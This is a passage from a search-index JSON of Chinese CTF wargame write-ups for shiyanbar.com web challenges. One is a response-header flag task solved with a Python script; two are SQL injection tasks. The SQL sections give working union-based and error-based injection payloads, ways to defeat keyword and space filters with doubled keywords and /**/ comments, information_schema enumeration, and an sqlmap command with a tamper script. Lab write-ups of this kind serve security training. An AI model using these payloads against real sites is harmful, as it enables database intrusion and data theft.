            "text": "天下武功唯快不破\n\n\n题目\n\n\n\n\n看看响应头\n\n\n格式：CTF{ }\n\n\n\n\n流程图\n\n\n解题步骤\n\n\n参考文章\n\n\n步骤\n\n\n0x1 查看响应\n\n\n\n\n响应头\n\n\n\n\nConnection: Keep-Alive\nContent-Length: 216\nContent-Type: text/html\nDate: Fri, 20 Jul 2018 11:13:13 GMT\nFLAG: UDBTVF9USElTX1QwX0NINE5HRV9GTDRHOnhtNW5JdEMzbg==\nKeep-Alive: timeout=5, max=100\nServer: Apache/2.4.18 (Win32) OpenSSL/1.0.2e PHP/5.3.29\n\n\n\n\n​   发现了flag\n\n\n\n\n响应体\n\n\n\n\n```html\n\n\nThere is no martial art is indefectible, while the fastest speed is the only way for long success.\n----You must do it as fast as you can!----\n\n   \n\n   ```\n\n\n发现提到，使用参数key来提交\n\n\n0x2 pytho提交\n\n\nimport urllib2\nimport urllib\nimport base64\nurl = r'http://ctf5.shiyanbar.com/web/10/10.php'\n\n\nresponse = urllib2.urlopen(url)\nflag = response.info().getheader('FLAG')\nflag = base64.b64decode(flag)\nflag = flag.split(':')[1]\n\npostdata = urllib.urlencode({'key':flag})\nrequest = urllib2.Request(url,data = postdata)\nresponse = urllib2.urlopen(request)\nprint response.read()\n\n\n\n\n解答思路\n\n\n\n\n全面查看请求得到的信息\n\n\n使用python按照要求提交\n\n\n\n\n漏洞挖掘思路\n\n\n\n\n无\n\n\n\n\n自动化解析\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n判断题目特征：\nweb\n \nphp\n \nmd5\n \n\n\n\n\n设定题目难度等级\nlevel\n为simple\n\n\n提交相应符合要求的字符串", 
            "title": "天下武功唯快不破"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_post_fast/#_1", 
            "text": "", 
            "title": "天下武功唯快不破"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_post_fast/#_2", 
            "text": "看看响应头  格式：CTF{ }", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_post_fast/#_3", 
            "text": "", 
            "title": "流程图"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_post_fast/#_4", 
            "text": "", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_post_fast/#_5", 
            "text": "", 
            "title": "参考文章"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_post_fast/#_6", 
            "text": "", 
            "title": "步骤"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_post_fast/#0x1", 
            "text": "响应头   Connection: Keep-Alive\nContent-Length: 216\nContent-Type: text/html\nDate: Fri, 20 Jul 2018 11:13:13 GMT\nFLAG: UDBTVF9USElTX1QwX0NINE5HRV9GTDRHOnhtNW5JdEMzbg==\nKeep-Alive: timeout=5, max=100\nServer: Apache/2.4.18 (Win32) OpenSSL/1.0.2e PHP/5.3.29  ​   发现了flag   响应体   ```html  There is no martial art is indefectible, while the fastest speed is the only way for long success. ----You must do it as fast as you can!---- \n    \n   ```  发现提到，使用参数key来提交", 
            "title": "0x1 查看响应"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_post_fast/#0x2-pytho", 
            "text": "import urllib2\nimport urllib\nimport base64\nurl = r'http://ctf5.shiyanbar.com/web/10/10.php'\n\n\nresponse = urllib2.urlopen(url)\nflag = response.info().getheader('FLAG')\nflag = base64.b64decode(flag)\nflag = flag.split(':')[1]\n\npostdata = urllib.urlencode({'key':flag})\nrequest = urllib2.Request(url,data = postdata)\nresponse = urllib2.urlopen(request)\nprint response.read()", 
            "title": "0x2 pytho提交"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_post_fast/#_7", 
            "text": "全面查看请求得到的信息  使用python按照要求提交", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_post_fast/#_8", 
            "text": "无", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_post_fast/#_9", 
            "text": "TODO    判断题目特征： web   php   md5     设定题目难度等级 level 为simple  提交相应符合要求的字符串", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection/", 
            "text": "简单sql注入\n\n\n题目\n\n\n\n\nhttp://ctf5.shiyanbar.com/423/web/\n \n\n\nflag\n\n\n到底过滤了什么东西？\n\n\n\n\n流程图\n\n\n解题步骤\n\n\n参考文章\n\n\n0x1 直接猜测表名和字段名\n\n\n\n\n解题思路：研究了好久，看了writeup才知道\n\n\n1）在文本框输入1，提交，链接变成id=1\n\n\n2）在文件框输入1‘，提交，报错，判断存在注入。\n\n\n3）初步预计后台表为flag,字段名为flag,需要构造union select flag from flag来执行。\n\n\n4）根据第二步的报错信息看，多加个‘，后面的语句需要再构造一个条件来结束’，注入语句为：1‘ union select flag from flag where 't'='t\n\n\n执行后报错：heck the manual that corresponds to your MySQL server version for the right syntax to use near 'flag flag 't'='t'' at line 1\n\n\n分析：根据错误信息发现只有变量了，其他的关键字都被过滤了。\n\n\n5）把关键字写2遍提交，发现如下报错： corresponds to your MySQL server version for the right syntax to use near 'unionselectflag fromflag where't'='t'' at line 1\n\n\n分析：发现空格被过滤了\n\n\n6)）使用+号在空格之前连接：\n\n\nhttp://ctf5.shiyanbar.com/423/web/?id=1\n '+unionunion +selectselect +flag+fromfrom +flag+wherewhere+'t'='t\n\n\n得到KEY:flag{xxxxxx}\n\n\n\n\n0x2 正常流程读取\n\n\n\n\nhttp://www.shiyanbar.com/ctf/writeup/4750\n\n\n\n\n步骤\n\n\n0x1 直接猜测法\n\n\n\n\n\n\n在文本框输入1，提交，链接变成id=1\n\n\n\n\n\n\n在文件框输入1‘，提交，报错，判断存在注入\n\n\n\n\n\n\n在文本框输入\ntest\n，提交，链接变成id=test，未返回错误，说明该注入类型为字符型注入\n\n\n\n\n\n\n参考上面的文章1\n\n\n\n\n\n\n在文章1的第五步当中，发现空格被过滤是对的，但是并不是因为编码的原因，即使将空格替换为+号，但是没有重复，依然会被过滤掉，经过测试，发现如下语句可以正常执行\n\n\n\n\n\n\nmysql\n   http://ctf5.shiyanbar.com/423/web/?id=1'unionunion  selectselect  flag fromfrom  flag wherewhere 't'='t\n\n\n所有被过滤的关键词（除了where）后面都必须跟两个空格，非关键词后面的空格不会被过滤掉，\n至于where后面为什么只需要一个空格，可能和分组的机制有关系，仍需分析\n\n\n不论空格被替换为+号还是/**/，但是不能重复出现两个/**/，虽然在mysql中可以正常执行，但是由于后台过滤只会把+号解析为空格，然后对每个以空格分割后的分组应用进行从后往前的关键词过滤，并且只进行一次\n\n\n\n\n基于上诉的分析，所以，可以不采用重复关键词的方法，只使用/**/替代掉空格，就会使得从后向前的过滤机制失效，从而可以不使用重复关键词的方法\n\n\n\n\n0x2 标准流程法\n\n\n\n\n基于上述过滤要点分析，先查询数据库名\n\n\n\n\nmyslq\n   1' union/**/select/**/database()'\n\n\n得到结果\nweb1\n\n\n\n\n猜测表名\n\n\n\n\nmysql\n   1' union/**/select/**/table_name from/**/information_schema.tables/**/where/**/table_schema/**/='web1\n\n\n这里报了错：\n\n\n\n\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '='web'' at line 1\n\n\n\n\n可以得知，\ntable_schema\n被作为关键词过滤了，但是过滤的方式却不同，即使使用双重关键词的方式依旧不行，尝试使用双重查询语句（nonrecursivereplacement有类似的功能），发现可以绕过\n\n\nmysql\n   http://ctf5.shiyanbar.com/423/web/?id=1' union/**/select/**/table_name from/**/information_schema.tables/**/where/**/table_schemtable_schemaa/**/='web1\n\n\n得到表名: \nflag\n和\nweb_1\n\n\n\n\n猜测字段名\n\n\n\n\n同样需要对\ninformation_schema.columns\n进行双重查询\n\n\nmysql\n   http://ctf5.shiyanbar.com/423/web/?id=1' union/**/select/**/column_namcolumn_namee/**/from/**/information_scheminformation_schema.columnsa.columns/**/where/**/table_name='flag\n\n\n得到字段名\nflag\n和\nid\n\n\n\n\n查询表数据\n\n\n\n\nmysql\n   1'union/**/select/**/flag from/**/flag where/**/'1'='1\n\n\n得到flag：\nflag{Y0u_@r3_5O_dAmn_90Od}\n\n\n解答思路\n\n\n\n\n判断是否存在注入点\n\n\n判断注入类型\n\n\n判断后台的过滤机制\n\n\n关键字被过滤\n\n\n重复关键词（例如selectselect），测试结果\n\n\n\n\n\n\n空格被过滤\n\n\n使用双重空格（使用+号替代也需要重复两次）\n\n\n\n\n\n\n~~该后台过滤的机制是将所有敏感字符只过滤第一次遇到的，所以将过滤关键词全部重复一次即可~~\n\n\n在有错误提示的情况下，可以有针对性的修改注入语句，如果没有错误提示，则需要遍历测试可能的绕过方式\n\n\n几个有关sql语法的点\n\n\nunion 关键词如果跟在字符串后面，不需要空格也能正常执行\n\n\nselect database()\n之后直接加上\n''\n可以正常执行，但 \nselect database() from ctf\n之后加上\n''\n会导致语法错误，所以，需要使用where子句来闭合\n\n\n\n\n漏洞挖掘思路\n\n\n\n\n无\n\n\n\n\n自动化解析\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n判断题目特征：\nweb\n \nphp\n \nmd5\n \n\n\n\n\n设定题目难度等级\nlevel\n为simple\n\n\n提交相应符合要求的字符串", 
            "title": "简单sql注入"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection/#sql", 
            "text": "", 
            "title": "简单sql注入"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection/#_1", 
            "text": "http://ctf5.shiyanbar.com/423/web/    flag  到底过滤了什么东西？", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection/#_2", 
            "text": "", 
            "title": "流程图"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection/#_3", 
            "text": "", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection/#_4", 
            "text": "", 
            "title": "参考文章"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection/#0x1", 
            "text": "解题思路：研究了好久，看了writeup才知道  1）在文本框输入1，提交，链接变成id=1  2）在文件框输入1‘，提交，报错，判断存在注入。  3）初步预计后台表为flag,字段名为flag,需要构造union select flag from flag来执行。  4）根据第二步的报错信息看，多加个‘，后面的语句需要再构造一个条件来结束’，注入语句为：1‘ union select flag from flag where 't'='t  执行后报错：heck the manual that corresponds to your MySQL server version for the right syntax to use near 'flag flag 't'='t'' at line 1  分析：根据错误信息发现只有变量了，其他的关键字都被过滤了。  5）把关键字写2遍提交，发现如下报错： corresponds to your MySQL server version for the right syntax to use near 'unionselectflag fromflag where't'='t'' at line 1  分析：发现空格被过滤了  6)）使用+号在空格之前连接：  http://ctf5.shiyanbar.com/423/web/?id=1  '+unionunion +selectselect +flag+fromfrom +flag+wherewhere+'t'='t  得到KEY:flag{xxxxxx}", 
            "title": "0x1 直接猜测表名和字段名"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection/#0x2", 
            "text": "http://www.shiyanbar.com/ctf/writeup/4750", 
            "title": "0x2 正常流程读取"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection/#_5", 
            "text": "", 
            "title": "步骤"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection/#0x1_1", 
            "text": "在文本框输入1，提交，链接变成id=1    在文件框输入1‘，提交，报错，判断存在注入    在文本框输入 test ，提交，链接变成id=test，未返回错误，说明该注入类型为字符型注入    参考上面的文章1    在文章1的第五步当中，发现空格被过滤是对的，但是并不是因为编码的原因，即使将空格替换为+号，但是没有重复，依然会被过滤掉，经过测试，发现如下语句可以正常执行    mysql\n   http://ctf5.shiyanbar.com/423/web/?id=1'unionunion  selectselect  flag fromfrom  flag wherewhere 't'='t  所有被过滤的关键词（除了where）后面都必须跟两个空格，非关键词后面的空格不会被过滤掉， 至于where后面为什么只需要一个空格，可能和分组的机制有关系，仍需分析  不论空格被替换为+号还是/**/，但是不能重复出现两个/**/，虽然在mysql中可以正常执行，但是由于后台过滤只会把+号解析为空格，然后对每个以空格分割后的分组应用进行从后往前的关键词过滤，并且只进行一次   基于上诉的分析，所以，可以不采用重复关键词的方法，只使用/**/替代掉空格，就会使得从后向前的过滤机制失效，从而可以不使用重复关键词的方法", 
            "title": "0x1 直接猜测法"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection/#0x2_1", 
            "text": "基于上述过滤要点分析，先查询数据库名   myslq\n   1' union/**/select/**/database()'  得到结果 web1   猜测表名   mysql\n   1' union/**/select/**/table_name from/**/information_schema.tables/**/where/**/table_schema/**/='web1  这里报了错：", 
            "title": "0x2 标准流程法"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection/#you-have-an-error-in-your-sql-syntax-check-the-manual-that-corresponds-to-your-mysql-server-version-for-the-right-syntax-to-use-near-web-at-line-1", 
            "text": "可以得知， table_schema 被作为关键词过滤了，但是过滤的方式却不同，即使使用双重关键词的方式依旧不行，尝试使用双重查询语句（nonrecursivereplacement有类似的功能），发现可以绕过  mysql\n   http://ctf5.shiyanbar.com/423/web/?id=1' union/**/select/**/table_name from/**/information_schema.tables/**/where/**/table_schemtable_schemaa/**/='web1  得到表名:  flag 和 web_1   猜测字段名   同样需要对 information_schema.columns 进行双重查询  mysql\n   http://ctf5.shiyanbar.com/423/web/?id=1' union/**/select/**/column_namcolumn_namee/**/from/**/information_scheminformation_schema.columnsa.columns/**/where/**/table_name='flag  得到字段名 flag 和 id   查询表数据   mysql\n   1'union/**/select/**/flag from/**/flag where/**/'1'='1  得到flag： flag{Y0u_@r3_5O_dAmn_90Od}", 
            "title": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '='web'' at line 1"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection/#_6", 
            "text": "判断是否存在注入点  判断注入类型  判断后台的过滤机制  关键字被过滤  重复关键词（例如selectselect），测试结果    空格被过滤  使用双重空格（使用+号替代也需要重复两次）    ~~该后台过滤的机制是将所有敏感字符只过滤第一次遇到的，所以将过滤关键词全部重复一次即可~~  在有错误提示的情况下，可以有针对性的修改注入语句，如果没有错误提示，则需要遍历测试可能的绕过方式  几个有关sql语法的点  union 关键词如果跟在字符串后面，不需要空格也能正常执行  select database() 之后直接加上 '' 可以正常执行，但  select database() from ctf 之后加上 '' 会导致语法错误，所以，需要使用where子句来闭合", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection/#_7", 
            "text": "无", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection/#_8", 
            "text": "TODO    判断题目特征： web   php   md5     设定题目难度等级 level 为simple  提交相应符合要求的字符串", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection_2/", 
            "text": "简单sql注入2\n\n\n题目\n\n\n\n\nhttp://ctf5.shiyanbar.com/web/index_2.php\n\n\nflag\n\n\n到底过滤了什么东西？\n\n\n\n\n流程图\n\n\n解题步骤\n\n\n参考文章\n\n\n0x1 直接猜测表名和字段名\n\n\n\n\n首先输入1，发现有将数据库的查询结果显示出来\n\n\n输入单引号，发现错误，这时候可以猜测后台查询语句:select name from table where id='xxx';\n\n\n输入'='，查询语句变成这样:select name from table where id=''='';     根据从左到右的比较可以得到where字句后面的值为1，而查询也爆出来3个结果\n\n\n接下来继续测试，输入'='select，或者'='or,或者'='union等都没有报错，都有三条结果显示出来\n\n\n而若是输入' or 1 #或者是' union或者是' or select #都显示侦测到SQL注入了，可以猜想后台应该是应该是这样处理的\n\n\n（代码大概是这样的，对不对我也不知道）\n\n\n```php\nstr=_SERVER['QUERY_STRING'];\n\n\nstr=urldecode(str);\n\n\nquery_list=explode(' ',str);\n\n\n//这个过滤数组应该还有挺多，我就不写了\n\n\n$filter_array={'or','#','union','select','where','and'};\n\n\nfor_each (query_list as value) {\n\n\nif (in_array(value,filter_array)) {\n\n    echo \"SQLI:detected\";\n\n    exit(0);\n\n}\n\n\n\n}\n```\n\n\n也就是说，空格和敏感字符的组合是会被查出来的，而在SQL注入中，可以拿来当做间隔用的还有/**/\n\n\n于是可以构造以下语句\n\n\n'/\n/union/\n/select/\n/flag/\n/from/**/flag#\n\n\n结果可以得到\n\n\nID: '/**/union/**/select/**/flag/**/from/**/flag#\nname: flag{Yxxxxxxxxxxxxxd}\n\n\n最后，问题来了,怎么知道后台表是flag,字段名是flag？\n\n\n至于会问这个问题的同学，我猜大概是前面的题没做，做第一道题的时候看别人的解析我也是一脸蒙蔽\n\n\n也是有这个问题。当然这个表名和字段名可以通过盲注给爆出来，有兴趣的话可以写一个python脚本去\n\n\n爆破，具体代码我就不贴了\n最后，新人第一次发帖，打脸请轻打.....\n\n\n\n\n0x2 正常流程读取\n\n\n\n\nhttp://www.shiyanbar.com/ctf/writeup/4750\n\n\n\n\n步骤\n\n\n0x1 直接猜测法\n\n\n\n\n\n\n在文本框输入1，提交，链接变成id=1\n\n\n\n\n\n\n在文件框输入1'，提交，报错，判断存在注入\n\n\n\n\n\n\n在文本框输入\ntest\n，提交，链接变成id=test，未返回错误，说明该注入类型为字符型注入\n\n\n\n\n\n\n在简单sql注入1中使用的payload为\n\n\n\n\n\n\nmysql\n   1 '+unionunion +selectselect +flag+fromfrom +flag+wherewhere+'t'='t\n\n\n在这题中空格已经被过滤了，所以需要将空格替换成/**/，并不使用双重注入\n\n\nmysql\n   1'/**/union/**/select/**/flag/**/from/**/flag/**/where/**/'t'='t\n\n\n由此得到答案\n\n\n0x2 标准注入\n\n\n\n\n当采用标准注入时，发现database()被检测出了sql注入\n\n\n\n\n1' union/**/select/**/database()'\n\n\n\n\n没有想到怎么才能避过检测，于是想到用sqlmap跑一跑\n\n\n补: 找到了可以绕过\n()\n的新方法：\n\n\n1'union/**/select/**/schema_name/**/from/**/information_schema.schemata/**/where/**/'1'='1\n\n\n\n\n\n\n使用sqlmap\n\n\n\n\nshell\n   sqlmap.py -u \"http://ctf5.shiyanbar.com/web/index_2.php?id=1\" --dbs --tamper \"space2comment.py\" --level 2 -v 3\n\n\n参数说明：\n\n\n\n\n--dbs 查找所有数据库\n\n\n\"space2comment.py\" 将空格转换成为/**/\n\n\n\n\n-v 3 显示payload\n\n\n\n\n\n\n获取数据库数量的payload\n\n\n\n\n\n\nmysql\n   1'/**/AND/**/(SELECT/**/8427/**/FROM(SELECT/**/COUNT(*),CONCAT(0x7162746671,(SELECT/**/IFNULL(CAST(COUNT(schema_name)/**/AS/**/CHAR),0x20)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA),0x717a717071,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.CHARACTER_SETS/**/GROUP/**/BY/**/x)a)/**/AND/**/'IUDH'='IUDH\n\n\n返回值：\n\n\nDuplicate entry 'qbtfq3qzqpq1' for key 'group_key'\n\n\n注意其中的值\n3\n\n\n\n\n依次返回三个表的payload\n\n\n\n\nmysql\n   1'/**/AND/**/(SELECT/**/8165/**/FROM(SELECT/**/COUNT(*),CONCAT(0x7162746671,(SELECT/**/MID((IFNULL(CAST(schema_name/**/AS/**/CHAR),0x20)),1,50)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA/**/LIMIT/**/0,1),0x717a717071,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.CHARACTER_SETS/**/GROUP/**/BY/**/x)a)/**/AND/**/'xprA'='xprA\n   [16:35:47] [INFO] retrieved: information_schema\n\n\n返回结果：\n\n\n### \nDuplicate entry 'qbtfqinformation_schemaqzqpq1' for key 'group_key'\n\n\nmysql\n   [16:35:47] [PAYLOAD] 1'/**/AND/**/(SELECT/**/3904/**/FROM(SELECT/**/COUNT(*),CONCAT(0x7162746671,(SELECT/**/MID((IFNULL(CAST(schema_name/**/AS/**/CHAR),0x20)),1,50)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA/**/LIMIT/**/1,1),0x717a717071,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.CHARACTER_SETS/**/GROUP/**/BY/**/x)a)/**/AND/**/'YvjH'='YvjH\n   [16:35:48] [INFO] retrieved: test\n\n\nmysql\n   [16:35:48] [PAYLOAD] 1'/**/AND/**/(SELECT/**/2380/**/FROM(SELECT/**/COUNT(*),CONCAT(0x7162746671,(SELECT/**/MID((IFNULL(CAST(schema_name/**/AS/**/CHAR),0x20)),1,50)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA/**/LIMIT/**/2,1),0x717a717071,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.CHARACTER_SETS/**/GROUP/**/BY/**/x)a)/**/AND/**/'huJK'='huJK\n   [16:35:49] [INFO] retrieved: web1\n\n\n以后来研究一下，sqlmap是如何在避过\ndatabase()\n检测的情况下，实现查询数据库名的\n\n\n解答思路\n\n\n\n\n判断是否存在注入点\n\n\n判断注入类型\n\n\n判断后台的过滤机制\n\n\n关键字被过滤\n\n\n重复关键词（例如selectselect），不成功\n\n\n\n\n\n\n空格被过滤\n\n\n使用双重空格（使用+号替代也需要重复两次），不成功\n\n\n\n\n\n\n使用/**/替换空格，测试成功\n\n\n在有错误提示的情况下，可以有针对性的修改注入语句，如果没有错误提示，则需要遍历测试可能的绕过方式\n\n\n需要研究sqlmap的注入流程\n\n\n\n\n漏洞挖掘思路\n\n\n\n\n无\n\n\n\n\n自动化解析\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n判断题目特征：\nweb\n \nphp\n \nmd5\n \n\n\n\n\n设定题目难度等级\nlevel\n为simple\n\n\n提交相应符合要求的字符串", 
            "title": "[shiyanbar.com] simple sql injection 2"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection_2/#_1", 
            "text": "http://ctf5.shiyanbar.com/web/index_2.php  flag  到底过滤了什么东西？", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection_2/#_2", 
            "text": "", 
            "title": "流程图"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection_2/#_3", 
            "text": "", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection_2/#_4", 
            "text": "", 
            "title": "参考文章"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection_2/#0x1", 
            "text": "首先输入1，发现有将数据库的查询结果显示出来  输入单引号，发现错误，这时候可以猜测后台查询语句:select name from table where id='xxx';  输入'='，查询语句变成这样:select name from table where id=''='';     根据从左到右的比较可以得到where字句后面的值为1，而查询也爆出来3个结果  接下来继续测试，输入'='select，或者'='or,或者'='union等都没有报错，都有三条结果显示出来  而若是输入' or 1 #或者是' union或者是' or select #都显示侦测到SQL注入了，可以猜想后台应该是应该是这样处理的  （代码大概是这样的，对不对我也不知道）  ```php\nstr=_SERVER['QUERY_STRING'];  str=urldecode(str);  query_list=explode(' ',str);  //这个过滤数组应该还有挺多，我就不写了  $filter_array={'or','#','union','select','where','and'};  for_each (query_list as value) {  if (in_array(value,filter_array)) {\n\n    echo \"SQLI:detected\";\n\n    exit(0);\n\n}  }\n```  也就是说，空格和敏感字符的组合是会被查出来的，而在SQL注入中，可以拿来当做间隔用的还有/**/  于是可以构造以下语句  '/ /union/ /select/ /flag/ /from/**/flag#  结果可以得到  ID: '/**/union/**/select/**/flag/**/from/**/flag#\nname: flag{Yxxxxxxxxxxxxxd}  最后，问题来了,怎么知道后台表是flag,字段名是flag？  至于会问这个问题的同学，我猜大概是前面的题没做，做第一道题的时候看别人的解析我也是一脸蒙蔽  也是有这个问题。当然这个表名和字段名可以通过盲注给爆出来，有兴趣的话可以写一个python脚本去  爆破，具体代码我就不贴了\n最后，新人第一次发帖，打脸请轻打.....", 
            "title": "0x1 直接猜测表名和字段名"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection_2/#0x2", 
            "text": "http://www.shiyanbar.com/ctf/writeup/4750", 
            "title": "0x2 正常流程读取"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection_2/#_5", 
            "text": "", 
            "title": "步骤"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection_2/#0x1_1", 
            "text": "在文本框输入1，提交，链接变成id=1    在文件框输入1'，提交，报错，判断存在注入    在文本框输入 test ，提交，链接变成id=test，未返回错误，说明该注入类型为字符型注入    在简单sql注入1中使用的payload为    mysql\n   1 '+unionunion +selectselect +flag+fromfrom +flag+wherewhere+'t'='t  在这题中空格已经被过滤了，所以需要将空格替换成/**/，并不使用双重注入  mysql\n   1'/**/union/**/select/**/flag/**/from/**/flag/**/where/**/'t'='t  由此得到答案", 
            "title": "0x1 直接猜测法"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection_2/#0x2_1", 
            "text": "当采用标准注入时，发现database()被检测出了sql注入   1' union/**/select/**/database()'  没有想到怎么才能避过检测，于是想到用sqlmap跑一跑  补: 找到了可以绕过 () 的新方法：  1'union/**/select/**/schema_name/**/from/**/information_schema.schemata/**/where/**/'1'='1   使用sqlmap   shell\n   sqlmap.py -u \"http://ctf5.shiyanbar.com/web/index_2.php?id=1\" --dbs --tamper \"space2comment.py\" --level 2 -v 3  参数说明：   --dbs 查找所有数据库  \"space2comment.py\" 将空格转换成为/**/   -v 3 显示payload    获取数据库数量的payload    mysql\n   1'/**/AND/**/(SELECT/**/8427/**/FROM(SELECT/**/COUNT(*),CONCAT(0x7162746671,(SELECT/**/IFNULL(CAST(COUNT(schema_name)/**/AS/**/CHAR),0x20)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA),0x717a717071,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.CHARACTER_SETS/**/GROUP/**/BY/**/x)a)/**/AND/**/'IUDH'='IUDH  返回值：  Duplicate entry 'qbtfq3qzqpq1' for key 'group_key'  注意其中的值 3   依次返回三个表的payload   mysql\n   1'/**/AND/**/(SELECT/**/8165/**/FROM(SELECT/**/COUNT(*),CONCAT(0x7162746671,(SELECT/**/MID((IFNULL(CAST(schema_name/**/AS/**/CHAR),0x20)),1,50)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA/**/LIMIT/**/0,1),0x717a717071,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.CHARACTER_SETS/**/GROUP/**/BY/**/x)a)/**/AND/**/'xprA'='xprA\n   [16:35:47] [INFO] retrieved: information_schema  返回结果：  ###  Duplicate entry 'qbtfqinformation_schemaqzqpq1' for key 'group_key'  mysql\n   [16:35:47] [PAYLOAD] 1'/**/AND/**/(SELECT/**/3904/**/FROM(SELECT/**/COUNT(*),CONCAT(0x7162746671,(SELECT/**/MID((IFNULL(CAST(schema_name/**/AS/**/CHAR),0x20)),1,50)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA/**/LIMIT/**/1,1),0x717a717071,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.CHARACTER_SETS/**/GROUP/**/BY/**/x)a)/**/AND/**/'YvjH'='YvjH\n   [16:35:48] [INFO] retrieved: test  mysql\n   [16:35:48] [PAYLOAD] 1'/**/AND/**/(SELECT/**/2380/**/FROM(SELECT/**/COUNT(*),CONCAT(0x7162746671,(SELECT/**/MID((IFNULL(CAST(schema_name/**/AS/**/CHAR),0x20)),1,50)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA/**/LIMIT/**/2,1),0x717a717071,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.CHARACTER_SETS/**/GROUP/**/BY/**/x)a)/**/AND/**/'huJK'='huJK\n   [16:35:49] [INFO] retrieved: web1  以后来研究一下，sqlmap是如何在避过 database() 检测的情况下，实现查询数据库名的", 
            "title": "0x2 标准注入"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection_2/#_6", 
            "text": "判断是否存在注入点  判断注入类型  判断后台的过滤机制  关键字被过滤  重复关键词（例如selectselect），不成功    空格被过滤  使用双重空格（使用+号替代也需要重复两次），不成功    使用/**/替换空格，测试成功  在有错误提示的情况下，可以有针对性的修改注入语句，如果没有错误提示，则需要遍历测试可能的绕过方式  需要研究sqlmap的注入流程", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection_2/#_7", 
            "text": "无", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection_2/#_8", 
            "text": "TODO    判断题目特征： web   php   md5     设定题目难度等级 level 为simple  提交相应符合要求的字符串", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_simple_sql_injection_3/", 
